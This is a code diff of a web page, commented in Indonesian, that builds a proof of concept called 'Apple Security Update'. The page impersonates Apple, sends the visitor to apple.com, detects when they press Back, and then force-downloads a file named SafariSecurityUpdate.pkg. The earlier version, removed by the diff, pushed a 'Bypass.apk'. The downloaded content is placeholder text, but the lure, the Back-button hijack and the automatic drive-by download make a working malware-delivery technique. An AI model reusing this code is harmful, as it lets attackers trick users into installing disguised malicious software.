@@ -3,60 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tester</title>
+    <title>Apple Security Update (PoC)</title>
     <style>
         body { 
-            font-family: -apple-system, sans-serif; 
-            display: flex; justify-content: center; align-items: center; 
-            height: 100vh; margin: 0; background: #f5f5f7; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            padding: 20px; 
+            background: #fafafa;
+            color: #333;
         }
-        .card { 
-            background: white; padding: 40px; border-radius: 18px; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08); text-align: center; max-width: 400px;
+        #ui-container {
+            max-width: 500px;
+            margin: 40px auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            text-align: center;
         }
-        .btn { 
-            display: inline-block; padding: 12px 25px; background: #0071e3; 
-            color: white; text-decoration: none; border-radius: 8px; font-weight: 500;
+        a.button { 
+            display: inline-block;
+            margin-top: 20px;
+            padding: 10px 20px;
+            background: #007aff;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 6px;
+            font-weight: bold;
+        }
+        a.button:hover {
+            background: #005bb5;
+        }
+        .instruction {
+            margin-top: 30px;
+            font-size: 13px;
+            color: #888;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
         }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h1>click the button below</h1>
-        
-        <a href="#" id="start-btn" class="btn">Click Here</a>
+    <div id="ui-container">
+        <h2>Loading...</h2>
     </div>
 
     <script>
-        const btn = document.getElementById('start-btn');
+        // Ambil routing dari URL parameter (?route=...)
+        const urlParams = new URLSearchParams(window.location.search);
+        const route = urlParams.get('route');
+        const container = document.getElementById('ui-container');
 
-        btn.onclick = (e) => {
-            e.preventDefault();
-            window.open("https://google.com", "_blank");
-            setTimeout(() => {
-                triggerDownload();
-            }, 1000);
-        };
+        // ROUTE 1: "/" (Inisiasi State)
+        if (!route || route === 'start') {
+            // Set state bahwa user sudah visit halaman umpan
+            sessionStorage.setItem('hasVisited', 'true');
+            // Redirect ke halaman lure tanpa history tambahan (replace)
+            window.location.replace('?route=lure-page');
+        }
+        
+        // ROUTE 2: "/lure-page.html" (Halaman Umpan)
+        else if (route === 'lure-page') {
+            const hasVisited = sessionStorage.getItem('hasVisited');
 
-        function triggerDownload() {
-            const fakeFileContent = "tester";
-            
-            // MIME Type diubah ke format standar Android APK
-            const blob = new Blob([fakeFileContent], { type: 'application/vnd.android.package-archive' });
+            if (hasVisited === 'true') {
+                // Reset state agar jika kembali ke sini, logic berubah
+                sessionStorage.setItem('hasVisited', 'false');
+
+                // Render UI Apple Security
+                container.innerHTML = `
+                    <h1 style="color: #000;">Apple Security Update</h1>
+                    <p>Please proceed to the main site for verification.</p>
+                    <a href="https://www.apple.com" class="button">Continue to Apple.com</a>
+                    
+                    <div class="instruction">
+                        <b>PoC Testing Steps:</b><br>
+                        1. Click the button above to leave this page.<br>
+                        2. Once on Apple.com, click your browser's <b>BACK</b> button.<br>
+                        3. The automated download will trigger.
+                    </div>
+                `;
+            } else {
+                // Jika hasVisited sudah false (berarti user menekan tombol Back), eksekusi download
+                window.location.replace('?route=trigger-download');
+            }
+        }
+        
+        // ROUTE 3: "/trigger-download" (Eksekusi Payload)
+        else if (route === 'trigger-download') {
+            container.innerHTML = `
+                <h2 style="color: #d9534f;">Payload Triggered!</h2>
+                <p>The proof-of-concept file has been downloaded.</p>
+            `;
+
+            // Proses pembuatan file virtual dan trigger download otomatis
+            const fakeFileContent = "This is a proof-of-concept file.";
+            const blob = new Blob([fakeFileContent], { type: 'application/octet-stream' });
             const blobUrl = URL.createObjectURL(blob);
 
-            const a = document.createElement('a');
-            a.href = blobUrl;
+            // Bikin elemen <a> tersembunyi untuk auto-click
+            const downloadLink = document.createElement('a');
+            downloadLink.href = blobUrl;
+            downloadLink.download = 'SafariSecurityUpdate.pkg';
+            document.body.appendChild(downloadLink);
+            downloadLink.click();
             
-            // Ekstensi file diubah menjadi .apk
-            a.download = 'Bypass.apk';
-            document.body.appendChild(a);
-            a.click();
-            
+            // Cleanup
+            document.body.removeChild(downloadLink);
             URL.revokeObjectURL(blobUrl);
-            document.querySelector('.card').innerHTML = `
-            `;
         }
     </script>
 </body>
